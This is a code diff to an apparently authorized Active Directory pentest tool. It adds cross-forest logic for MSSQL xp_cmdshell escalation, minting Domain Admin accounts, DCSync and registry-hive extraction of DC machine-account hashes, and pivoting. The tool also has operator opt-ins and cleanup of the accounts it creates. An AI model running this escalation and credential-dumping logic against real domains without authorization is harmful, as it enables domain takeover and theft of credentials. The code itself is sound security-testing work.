@@ -3310,14 +3310,24 @@ def _resolve_linked_escalation_target(
     the escalation target IS a DC, the minted account is a DOMAIN account added to
     "Domain Admins" (``is_dc=True``), otherwise a local Administrator.
 
-    ``is_dc`` deliberately stays scoped to ``domain`` (the auth domain) even in
-    the cross-domain case: :class:`MssqlSeImpersonateService`'s DC-branch
-    verification (native LDAP RID-512 check) is hardcoded to query ``domain``,
-    so flipping ``is_dc`` for a foreign DC would break that verification, not
-    fix it. ``target_domain`` is a SEPARATE, additive resolution — see
-    :func:`_resolve_cross_domain_target_domain` — used only for the downstream
-    credential handoff (which domain a minted credential must be verified
-    against), never for the exploitation service's own group/verification choice.
+    ``is_dc`` is checked against the escalation TARGET's own domain's DC
+    topology, not the auth domain's — resolved via ``target_domain`` (see
+    :func:`_resolve_cross_domain_target_domain`, computed first so this check can
+    consume it). In a same-domain escalation ``target_domain == domain`` and this
+    is unchanged; in a cross-forest linked-server chain (auth domain
+    ``darkzero.htb`` escalating a linked target that is a DC of ``darkzero.ext``)
+    the auth domain's DC records never match the foreign DC's FQDN/IP, so an
+    auth-domain-scoped check always resolves ``is_dc=False`` — silently routing a
+    genuine Domain Controller through the local-Administrators branch instead of
+    Domain Admins (RID 512). Uses :func:`resolve_domain_controllers`, the
+    alias-aware DC-topology SSOT (IP<->FQDN<->short-name), rather than a private
+    string comparison. ``net user``/``net group`` still run through the
+    LINKED-SERVER chain authenticated with the auth-domain credential (unchanged
+    connection semantics) — only the "is this target a DC, and which domain's DC
+    topology proves it" question is now scoped correctly. The DC-branch
+    verification (native LDAP RID-512 check) is likewise scoped to
+    ``target_domain``, not the connection ``domain`` — see
+    :class:`MssqlSeImpersonateService`'s ``verification_domain``.
 
     Args:
         shell: The MSSQL shell (used to load the attack graph + domains data).
@@ -3333,6 +3343,7 @@ def _resolve_linked_escalation_target(
     from adscan_internal.models.domain import (  # noqa: PLC0415
         resolve_dc_fqdn,
         resolve_dc_ip,
+        resolve_domain_controllers,
     )
     from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
         resolve_netexec_target_for_node_label,
@@ -3353,23 +3364,41 @@ def _resolve_linked_escalation_target(
         print_exception(exception=exc)
     target_host = str(resolved_host or label or "").strip()
 
-    host_l = target_host.lower()
-    is_dc = bool(host_l) and (
-        host_l == dc_fqdn
-        or (bool(kdc_host) and host_l == str(kdc_host).lower())
-        or (bool(dc_fqdn) and host_l.split(".", 1)[0] == dc_fqdn.split(".", 1)[0])
-    )
-
-    if is_dc:
-        target_fqdn = dc_fqdn or target_host
-        target_ip = str(kdc_host or target_host)
-    else:
-        target_fqdn = target_host if "." in target_host else ""
-        target_ip = target_host
-
+    # Resolve target_domain FIRST — is_dc must be checked against ITS DC
+    # topology, not the auth domain's (see docstring: the cross-forest bug).
     target_domain = _resolve_cross_domain_target_domain(
         shell, auth_domain=domain, target_host=target_host
     )
+    target_domain_record = (
+        (getattr(shell, "domains_data", None) or {}).get(target_domain) or {}
+    )
+    if target_domain != domain and target_domain_record:
+        target_dc_topology = resolve_domain_controllers(target_domain_record)
+        is_dc = bool(target_host) and (
+            target_dc_topology.is_sole_dc(target_host) is not None
+        )
+        target_dc_fqdn = str(
+            resolve_dc_fqdn(target_domain_record, target_domain=target_domain) or ""
+        ).lower()
+        target_kdc_host = resolve_dc_ip(target_domain_record)
+    else:
+        # Same-domain escalation (the common case): unchanged behaviour, scoped
+        # to the auth domain's own DC record.
+        host_l = target_host.lower()
+        is_dc = bool(host_l) and (
+            host_l == dc_fqdn
+            or (bool(kdc_host) and host_l == str(kdc_host).lower())
+            or (bool(dc_fqdn) and host_l.split(".", 1)[0] == dc_fqdn.split(".", 1)[0])
+        )
+        target_dc_fqdn = dc_fqdn
+        target_kdc_host = kdc_host
+
+    if is_dc:
+        target_fqdn = target_dc_fqdn or target_host
+        target_ip = str(target_kdc_host or target_host)
+    else:
+        target_fqdn = target_host if "." in target_host else ""
+        target_ip = target_host
     return target_host, target_ip, target_fqdn, is_dc, target_domain
 
 
@@ -3721,6 +3750,200 @@ def run_openrowset_bulk_read_on_instance(
     )
 
 
+def _resolve_target_pdc_for_extraction(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    target_domain: str,
+    kdc_host: str | None,
+    source_host: str,
+    username: str,
+    password: str,
+    linked_server: str | None,
+    xp_result: "XpCmdshellExecResult",
+) -> tuple[str | None, bool]:
+    """Resolve the escalation TARGET domain's own PDC IP for DA verification/DCSync.
+
+    Factored out of :func:`run_xpcmdshell_system_escalation_followup` so BOTH
+    the confirmed-membership credential handoff (step 7) AND the
+    not-confirmed-but-is-DC machine-account extraction (step 7b) can consult
+    the SAME cross-forest-aware PDC resolution + rescue-pivot logic, instead
+    of only the confirmed branch computing it. See the caller's step 7
+    docstring for the cross-forest rationale (HTB DarkZero: auth domain
+    ``darkzero.htb``, target domain ``darkzero.ext``).
+
+    Returns:
+        ``(target_pdc_ip, skip_live_verification)`` -- ``target_pdc_ip`` is
+        the target domain's own PDC/DC IP (or ``None`` if indeterminate);
+        ``skip_live_verification`` is True when the target domain is
+        confirmed unreachable from the current vantage even after the
+        rescue-pivot attempt (a live re-verification there would always fail
+        on network grounds, not credential validity).
+    """
+    from adscan_internal.models.domain import (  # noqa: PLC0415
+        resolve_dc_ip,
+        resolve_dc_reachability,
+    )
+
+    if target_domain != domain:
+        target_domain_record = (
+            getattr(shell, "domains_data", None) or {}
+        ).get(target_domain) or {}
+        target_pdc_ip = resolve_dc_ip(target_domain_record)
+        target_dc_reachable = resolve_dc_reachability(target_domain_record)
+
+        # Before blindly trusting a cross-domain credential/extraction attempt,
+        # check whether the xp_cmdshell RCE we just proved opens a REAL route
+        # to target_domain's DC that ADscan didn't have from the original
+        # vantage. Gated on the operator's scan-config pivoting opt-in; a
+        # pivot failure/no-candidates degrades to the skip_live_verification
+        # fallback below, unchanged.
+        if target_dc_reachable is False and is_pivoting_enabled(shell):
+            try:
+                maybe_pivot_after_xpcmdshell_success(
+                    shell,
+                    domain=domain,
+                    host=source_host,
+                    username=username,
+                    password=password,
+                    linked_server=linked_server,
+                    identity=xp_result.execution_identity,
+                )
+                # The pivot may have re-enumerated trusts and refreshed
+                # connectivity in domains_data -- re-read fresh rather than
+                # trusting the pre-pivot snapshot above.
+                target_domain_record = (
+                    getattr(shell, "domains_data", None) or {}
+                ).get(target_domain) or {}
+                target_pdc_ip = resolve_dc_ip(target_domain_record) or target_pdc_ip
+                target_dc_reachable = resolve_dc_reachability(target_domain_record)
+            except Exception as pivot_exc:  # noqa: BLE001
+                # Never let a pivot attempt block or crash the follow-up --
+                # degrade to the existing skip_live_verification fallback below.
+                telemetry.capture_exception(pivot_exc)
+                print_exception(exception=pivot_exc)
+    else:
+        target_pdc_ip = kdc_host
+        target_dc_reachable = True
+
+    # The target domain's own DC is confirmed unreachable from the current
+    # vantage -- a live Kerberos/LDAP verification or DCSync attempt against
+    # it would always fail on network grounds, not credential validity.
+    skip_live_verification = target_domain != domain and target_dc_reachable is False
+    return target_pdc_ip, skip_live_verification
+
+
+def _attempt_dc_credential_extraction(
+    shell: MssqlShell,
+    *,
+    target_domain: str,
+    target_pdc_ip: str,
+    target_fqdn: str | None,
+    target_label: str,
+    admin_user: str,
+    admin_pw: str,
+) -> None:
+    """Attempt the SYSTEM-on-DC machine-account/DCSync credential extraction.
+
+    The box a SYSTEM session was just proven on IS a domain controller of
+    ``target_domain``, so that session already has everything a Domain Admin
+    has on it -- ``DS-Replication-Get-Changes-All`` included, via the DC's
+    OWN machine account (recovered by
+    :func:`extract_dc_credentials_via_system_session`'s registry-hive
+    fallback), independent of whether the freshly-minted ``admin_user``
+    account was confirmed to land in Domain Admins. ``admin_user``/``admin_pw``
+    are still passed as the FIRST DCSync attempt's credential -- when they
+    genuinely are Domain Admins, that is the cheap, complete path; when they
+    are not (an unconfirmed or genuinely-failed group add), the underlying
+    extraction is conservative: a rights-denied response on that direct
+    attempt does NOT match the DRSUAPI-unreachable signal, so the
+    registry-hive/machine-account fallback is only reached when the direct
+    attempt fails for a TRANSPORT reason (dynamic RPC firewalled), never as a
+    blanket retry for an auth/rights failure. So calling this unconditionally
+    for any ``is_dc`` + proven-SYSTEM case is safe -- it either succeeds via
+    the minted admin, succeeds via the machine account (transport-blocked
+    case), or safely no-ops (genuine rights failure), never sprays or trusts
+    an unconfirmed credential downstream.
+
+    Best-effort: never raises (mirrors the caller's per-step exception
+    isolation), so a failure here never aborts the surrounding follow-up.
+    """
+    try:
+        from adscan_internal.services.mssql_system_dc_extraction import (  # noqa: PLC0415
+            extract_dc_credentials_via_system_session,
+        )
+
+        extraction = extract_dc_credentials_via_system_session(
+            shell,
+            domain=target_domain,
+            dc_ip=target_pdc_ip,
+            dc_hostname=target_fqdn or None,
+            username=admin_user,
+            password=admin_pw,
+        )
+        if extraction.success:
+            print_success(
+                "MSSQL SYSTEM escalation follow-up: extracted "
+                f"{extraction.accounts_extracted} domain accounts "
+                f"from {mark_sensitive(target_domain, 'domain')} "
+                f"via {extraction.strategy}"
+                + (
+                    " (registry-hive fallback — DRSUAPI was "
+                    "unreachable from this vantage)."
+                    if extraction.strategy == "registry_hive_fallback"
+                    else "."
+                )
+            )
+            if extraction.krbtgt_found:
+                from adscan_internal.services.domain_compromise_promotion import (  # noqa: PLC0415
+                    CompromiseEvidence,
+                    promote_to_pwned,
+                )
+
+                promote_to_pwned(
+                    shell,
+                    domain=target_domain,
+                    evidence=CompromiseEvidence.KRBTGT_HASH_EXTRACTED,
+                    username=admin_user,
+                    credential=admin_pw,
+                )
+        elif extraction.machine_account_nt_hash and extraction.machine_account_name:
+            # DCSync itself did not complete (e.g. DRSUAPI unreachable even
+            # for the machine account) but the registry-hive dump DID recover
+            # the DC's own machine-account hash — persist it so it is not
+            # lost; it is independently useful (S4U2Self, future replication
+            # attempts).
+            from adscan_internal.cli.machine_account_persist import (  # noqa: PLC0415
+                persist_machine_account_credential,
+            )
+
+            persist_machine_account_credential(
+                shell,
+                domain=target_domain,
+                machine_account=extraction.machine_account_name,
+                nt_hash=extraction.machine_account_nt_hash,
+                dc_hostname=target_fqdn or target_label,
+                credential_origin="mssql_seimpersonate_registry_dump",
+                prompt_for_user_privs_after=False,
+                skip_hash_cracking=True,
+                verify_credential=False,
+            )
+            print_info_debug(
+                "MSSQL SYSTEM escalation follow-up: DCSync did not "
+                f"complete ({extraction.error}); persisted the "
+                "recovered DC machine-account hash instead."
+            )
+        else:
+            print_info_debug(
+                "MSSQL SYSTEM escalation follow-up: SYSTEM-on-DC "
+                f"credential extraction did not complete: "
+                f"{extraction.error}"
+            )
+    except Exception as extract_exc:  # noqa: BLE001
+        telemetry.capture_exception(extract_exc)
+        print_exception(exception=extract_exc)
+
+
 def run_xpcmdshell_system_escalation_followup(
     shell: MssqlShell,
     *,
@@ -3791,16 +4014,15 @@ def run_xpcmdshell_system_escalation_followup(
                 shell, domain=domain, to_label=to_label, linked_server=linked_server
             )
         )
-        # target_ip/target_fqdn are no longer needed for edge recording — the
-        # derived escalation edge now self-loops on target_label (see step 6
-        # below), matching the XpCmdshell self-loop's from/to labels exactly.
-        del target_ip, target_fqdn
+        # target_ip is not needed for edge recording — the derived escalation
+        # edge self-loops on target_label (see step 6 below), matching the
+        # XpCmdshell self-loop's from/to labels exactly. target_fqdn IS still
+        # needed: the SYSTEM-on-DC credential-extraction attempt (step 7b)
+        # uses it as the DC's Kerberos SPN hostname for the DCSync SMBConfig.
+        del target_ip
 
         # 3) Build the backend the SAME way execute_xp_cmdshell_on_instance does.
-        from adscan_internal.models.domain import (  # noqa: PLC0415
-            resolve_dc_ip,
-            resolve_dc_reachability,
-        )
+        from adscan_internal.models.domain import resolve_dc_ip  # noqa: PLC0415
         from adscan_internal.services.mssql_auth import (  # noqa: PLC0415
             resolve_mssql_ntlm_fallback_secret,
         )
@@ -3834,10 +4056,68 @@ def run_xpcmdshell_system_escalation_followup(
             ntlm_fallback_secret=ntlm_fallback_secret,
         )
 
-        # 4) Minted admin identity (recognizable, policy-compliant).
-        admin_user, admin_pw = _default_minted_identity(
+        # 4) Minted admin identity — create-new-vs-reuse-an-owned, routed through
+        # the shared SSOT (adscan_internal/services/privileged_account_provisioning.py)
+        # so this follow-up offers the same operator choice the RBCD/HasSession
+        # flows do, and the elevation SCOPE (Domain Admins on a DC vs local
+        # Administrators otherwise) is decided identically everywhere — reusing
+        # the SAME is_dc semantics _resolve_linked_escalation_target already
+        # computed (scoped to target_domain's own DC topology, cross-forest safe).
+        from adscan_internal.services.privileged_account_provisioning import (  # noqa: PLC0415
+            ProvisioningAction,
+            plan_privileged_account,
+        )
+
+        default_admin_user, default_admin_pw = _default_minted_identity(
             shell, domain=domain, username=username, password=password
         )
+        target_domain_data = (
+            getattr(shell, "domains_data", None) or {}
+        ).get(target_domain) or {}
+        owned_credentials = (
+            target_domain_data.get("credentials")
+            if isinstance(target_domain_data.get("credentials"), dict)
+            else {}
+        )
+        # Never offer the executing connection's own principal as a "reuse"
+        # candidate — it is already what is authenticating this SQL session,
+        # not a distinct principal worth promoting to admin.
+        reuse_pool = {
+            str(user): str(secret or "")
+            for user, secret in owned_credentials.items()
+            if str(user).strip().lower() != str(username).strip().lower()
+        }
+        plan = plan_privileged_account(
+            shell,
+            domain=target_domain,
+            target_host=target_host,
+            default_account_name=default_admin_user,
+            default_account_secret=default_admin_pw,
+            domains_data=getattr(shell, "domains_data", None),
+            reuse_pool=reuse_pool,
+            prompt_title="MSSQL SYSTEM escalation — privileged account",
+        )
+        if plan.is_cancelled:
+            print_info(
+                "MSSQL SYSTEM escalation follow-up cancelled by operator; "
+                "reverting the temporarily-enabled xp_cmdshell."
+            )
+            revert_deferred_xp_cmdshell(
+                shell,
+                domain=domain,
+                host=source_host,
+                username=username,
+                password=password,
+                xp_result=xp_result,
+            )
+            return
+        admin_user = plan.account_name
+        admin_pw = plan.account_secret or default_admin_pw
+        create_new_account = plan.action is ProvisioningAction.CREATE_NEW
+        # is_dc keeps driving the connection/verification wiring below
+        # (verification_domain, DCSync follow-up); the plan's elevation scope
+        # is derived identically from the SAME target_host/target_domain, so
+        # the two never disagree (both consume resolve_domain_controllers).
 
         # 5) Drive the existing escalation service (linked-server aware).
         svc = MssqlSeImpersonateService(
@@ -3855,6 +4135,11 @@ def run_xpcmdshell_system_escalation_followup(
             target_host=target_host,
             is_dc=is_dc,
             shell=shell,
+            # The DC-branch Domain Admins (RID-512) verification must query the
+            # ESCALATION TARGET's own domain, not the auth domain — see
+            # _resolve_linked_escalation_target's docstring for the cross-forest
+            # rationale (target_domain is already correctly resolved there).
+            verification_domain=target_domain,
         )
         if not svc.can_exploit():
             print_info_debug(
@@ -3870,7 +4155,9 @@ def run_xpcmdshell_system_escalation_followup(
                     "MSSQL SYSTEM escalation follow-up: CLR setup failed; skipping."
                 )
                 return
-            result = session.execute_admin_user(admin_user, admin_pw, create_user=True)
+            result = session.execute_admin_user(
+                admin_user, admin_pw, create_user=create_new_account
+            )
             if not result.success:
                 marked_target = mark_sensitive(target_label, "hostname")
                 print_warning(
@@ -3943,75 +4230,81 @@ def run_xpcmdshell_system_escalation_followup(
             # AS-REQ to the WRONG KDC and the credential never resolves (2026-07-21
             # HTB DarkZero live bug). Resolve the credential's OWN domain's PDC IP
             # instead of reusing the auth domain's kdc_host.
-            if result.membership_confirmed:
+            #
+            # Keep the runtime membership snapshot (memberships.json) in sync with
+            # this VERIFIED group add so downstream attack-path materialization
+            # sees the escalation without re-enumerating -- mirrors the
+            # exploits.py AddMember follow-up. Skipped for a REUSE_EXISTING
+            # account (create_new_account is False): the operator already owned
+            # that principal, so it was either already a member (no change to
+            # record) or its membership predates this follow-up and is not
+            # ADscan's to attribute/revert. DC target -> domain-wide Domain
+            # Admins in target_domain (the realm the account was minted in, not
+            # the auth domain); member-server target -> a per-host AdminTo edge
+            # (local Administrators is host-scoped, not domain-wide).
+            if result.membership_confirmed and create_new_account:
                 try:
-                    if target_domain != domain:
-                        target_domain_record = (
-                            getattr(shell, "domains_data", None) or {}
-                        ).get(target_domain) or {}
-                        target_pdc_ip = resolve_dc_ip(target_domain_record)
-                        target_dc_reachable = resolve_dc_reachability(
-                            target_domain_record
+                    if is_dc:
+                        from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                            add_runtime_user_group_membership,
                         )
 
-                        # Before blindly trusting this cross-domain credential,
-                        # check whether the xp_cmdshell RCE we just proved opens
-                        # a REAL route to target_domain's DC that ADscan didn't
-                        # have from the original vantage (e.g. a cross-forest
-                        # linked-server chain landing on a DC that itself sits
-                        # on the trust-partner's internal segment). Gated on
-                        # the operator's scan-config pivoting opt-in; a pivot
-                        # failure/no-candidates degrades to today's
-                        # skip_live_verification fallback below, unchanged.
-                        if target_dc_reachable is False and is_pivoting_enabled(
-                            shell
-                        ):
-                            try:
-                                maybe_pivot_after_xpcmdshell_success(
-                                    shell,
-                                    domain=domain,
-                                    host=source_host,
-                                    username=username,
-                                    password=password,
-                                    linked_server=linked_server,
-                                    identity=xp_result.execution_identity,
-                                )
-                                # The pivot may have re-enumerated trusts and
-                                # refreshed connectivity in domains_data --
-                                # re-read fresh rather than trusting the
-                                # pre-pivot snapshot above.
-                                target_domain_record = (
-                                    getattr(shell, "domains_data", None) or {}
-                                ).get(target_domain) or {}
-                                target_pdc_ip = (
-                                    resolve_dc_ip(target_domain_record)
-                                    or target_pdc_ip
-                                )
-                                target_dc_reachable = resolve_dc_reachability(
-                                    target_domain_record
-                                )
-                            except Exception as pivot_exc:  # noqa: BLE001
-                                # Never let a pivot attempt block or crash the
-                                # follow-up -- degrade to the existing
-                                # skip_live_verification fallback below.
-                                telemetry.capture_exception(pivot_exc)
-                                print_exception(exception=pivot_exc)
+                        add_runtime_user_group_membership(
+                            shell,
+                            target_domain,
+                            username=admin_user,
+                            group_name="Domain Admins",
+                            source="mssql_seimpersonate_escalation",
+                            evidence={
+                                "action": "add_to_domain_admins",
+                                "technique": "mssql_" + result.technique,
+                                "target": target_label,
+                            },
+                            origin_kind="directory_write",
+                            origin_technique="mssql_" + result.technique,
+                            origin_relation="MssqlAdminGroupAdd",
+                            cleanup_behavior="remove_directory_and_runtime",
+                        )
                     else:
-                        target_pdc_ip = kdc_host
-                        target_dc_reachable = True
+                        from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                            add_runtime_admin_to_edge,
+                        )
 
-                    # The target domain's own DC is confirmed unreachable from the
-                    # current vantage (cross-domain connectivity precheck run
-                    # during trust enumeration) -- a live Kerberos/LDAP
-                    # verification against it would always fail on network
-                    # grounds, not on credential validity. SYSTEM + admin-group
-                    # membership were already proven over the linked-server SQL
-                    # channel itself, so trust that proof instead of forcing a
-                    # verification attempt that cannot succeed and would
-                    # otherwise misfire the USER_NOT_FOUND credential-recovery /
-                    # spray-fallback flow.
-                    skip_live_verification = (
-                        target_domain != domain and target_dc_reachable is False
+                        add_runtime_admin_to_edge(
+                            shell,
+                            target_domain,
+                            username=admin_user,
+                            host_identifier=target_host,
+                            target_hostname=target_fqdn or None,
+                            source="mssql_seimpersonate_escalation",
+                            evidence={
+                                "action": "add_to_local_administrators",
+                                "technique": "mssql_" + result.technique,
+                            },
+                        )
+                except Exception as membership_exc:  # noqa: BLE001
+                    telemetry.capture_exception(membership_exc)
+                    print_exception(exception=membership_exc)
+                    print_info_debug(
+                        "MSSQL SYSTEM escalation follow-up: group membership "
+                        "changed on the target, but ADscan could not update the "
+                        "runtime membership snapshot."
+                    )
+
+            if result.membership_confirmed:
+                try:
+                    target_pdc_ip, skip_live_verification = (
+                        _resolve_target_pdc_for_extraction(
+                            shell,
+                            domain=domain,
+                            target_domain=target_domain,
+                            kdc_host=kdc_host,
+                            source_host=source_host,
+                            username=username,
+                            password=password,
+                            linked_server=linked_server,
+                            xp_result=xp_result,
+                        )
                     )
                     if skip_live_verification:
                         print_info_debug(
@@ -4033,6 +4326,28 @@ def run_xpcmdshell_system_escalation_followup(
                         credential_origin="mssql_seimpersonate",
                         trusted_manual_validation=skip_live_verification,
                     )
+
+                    # 7b) SYSTEM-on-DC: the box we just proved SYSTEM on IS a
+                    # domain controller of target_domain, so this session
+                    # already has everything a Domain Admin has on it —
+                    # attempt DCSync directly with the credential we just
+                    # minted (now genuinely Domain Admins, per the is_dc fix
+                    # above) instead of relying only on add_credential's
+                    # generic DA-detection prompt chain, which has no
+                    # registry-hive fallback when dynamic RPC (DRSUAPI) is
+                    # firewalled over a pivot. Skipped when the DC is known
+                    # unreachable from this vantage (skip_live_verification) —
+                    # a fresh connection attempt there cannot succeed either.
+                    if is_dc and target_pdc_ip and not skip_live_verification:
+                        _attempt_dc_credential_extraction(
+                            shell,
+                            target_domain=target_domain,
+                            target_pdc_ip=target_pdc_ip,
+                            target_fqdn=target_fqdn,
+                            target_label=target_label,
+                            admin_user=admin_user,
+                            admin_pw=admin_pw,
+                        )
                 except Exception as cred_exc:  # noqa: BLE001
                     telemetry.capture_exception(cred_exc)
                     print_exception(exception=cred_exc)
@@ -4041,14 +4356,100 @@ def run_xpcmdshell_system_escalation_followup(
                     "MSSQL SYSTEM escalation follow-up: group membership not "
                     "confirmed; skipping credential handoff."
                 )
+                # RC: even though the FRESHLY-MINTED account's group membership
+                # could not be confirmed (e.g. a single immediate RID-512 LDAP
+                # probe returned inconclusive over the pivot, or replication
+                # lag), a proven SYSTEM session on a DC of target_domain does
+                # NOT depend on that account for domain-credential extraction:
+                # SYSTEM on a writable DC IS that DC's own machine account
+                # (<HOSTNAME>$), which carries DS-Replication-Get-Changes-All
+                # by default. Attempt the SAME machine-account/DCSync
+                # extraction here too, decoupled from membership_confirmed —
+                # this is what let HTB DarkZero's cross-forest DC02 SYSTEM
+                # proof still yield the domain credential dump even though the
+                # created-account verify came back inconclusive. The minted
+                # admin_user/admin_pw are still passed as the FIRST DCSync
+                # attempt's credential (cheap path when they genuinely landed
+                # in Domain Admins); the underlying extraction is conservative
+                # about escalating to the machine-account fallback (see
+                # _attempt_dc_credential_extraction's docstring), so this never
+                # trusts or hands off the unconfirmed credential downstream --
+                # only a machine-account hash or DCSync'd domain secrets are
+                # ever persisted.
+                if is_dc:
+                    try:
+                        target_pdc_ip, skip_live_verification = (
+                            _resolve_target_pdc_for_extraction(
+                                shell,
+                                domain=domain,
+                                target_domain=target_domain,
+                                kdc_host=kdc_host,
+                                source_host=source_host,
+                                username=username,
+                                password=password,
+                                linked_server=linked_server,
+                                xp_result=xp_result,
+                            )
+                        )
+                        if target_pdc_ip and not skip_live_verification:
+                            _attempt_dc_credential_extraction(
+                                shell,
+                                target_domain=target_domain,
+                                target_pdc_ip=target_pdc_ip,
+                                target_fqdn=target_fqdn,
+                                target_label=target_label,
+                                admin_user=admin_user,
+                                admin_pw=admin_pw,
+                            )
+                    except Exception as extract_unconfirmed_exc:  # noqa: BLE001
+                        telemetry.capture_exception(extract_unconfirmed_exc)
+                        print_exception(exception=extract_unconfirmed_exc)
 
-            # 8) Remove the minted account AFTER the credential pipeline has
-            # consumed it, while the SYSTEM session is still alive.
-            try:
-                session.revert_admin_user(admin_user)
-            except Exception as revert_exc:  # noqa: BLE001
-                telemetry.capture_exception(revert_exc)
-                print_exception(exception=revert_exc)
+            # 8) DEFER removing the minted account — do NOT revert it here.
+            # add_credential (step 7) only ran the SYNCHRONOUS privilege
+            # sweeps; attack-path materialization and later scan phases are a
+            # SEPARATE, LATER pass that re-authenticates using whatever
+            # credential domains_data currently holds for target_domain — if
+            # this account were deleted now, that later pass authenticates as
+            # a principal the KDC has never heard of
+            # (KDC_ERR_C_PRINCIPAL_UNKNOWN). Register it for a scan-end
+            # reconciliation instead (mirrors the deferred xp_cmdshell
+            # revert): the account stays alive through every later consumer,
+            # and do_exit reverts it via a plain LDAP delete once the account
+            # genuinely has nothing left to authenticate for. See
+            # services/mssql_admin_account_cleanup.py.
+            #
+            # ONLY a CREATE_NEW account is ever a cleanup candidate — a
+            # REUSE_EXISTING account is one the operator already owned before
+            # this follow-up ran; it pre-existed and must never be queued for
+            # deletion (session.minted_account_change_id is also None in that
+            # case, since _finalize_with_admin_add only registers a ledger
+            # record when create_user=True, but the create_new_account gate
+            # here makes the invariant explicit rather than incidental).
+            if create_new_account:
+                try:
+                    from adscan_internal.services.mssql_admin_account_cleanup import (  # noqa: PLC0415
+                        register_deferred_admin_account_revert,
+                    )
+
+                    register_deferred_admin_account_revert(
+                        shell,
+                        change_id=session.minted_account_change_id,
+                        domain=target_domain,
+                        username=admin_user,
+                        is_dc=is_dc,
+                        target_host=target_host,
+                        target_hostname=target_fqdn,
+                    )
+                except Exception as revert_exc:  # noqa: BLE001
+                    telemetry.capture_exception(revert_exc)
+                    print_exception(exception=revert_exc)
+            else:
+                print_info_debug(
+                    "MSSQL SYSTEM escalation follow-up: reused an already-owned "
+                    f"account ({mark_sensitive(admin_user, 'user')}); no cleanup "
+                    "revert queued (it pre-existed this follow-up)."
+                )
         finally:
             try:
                 session.teardown()
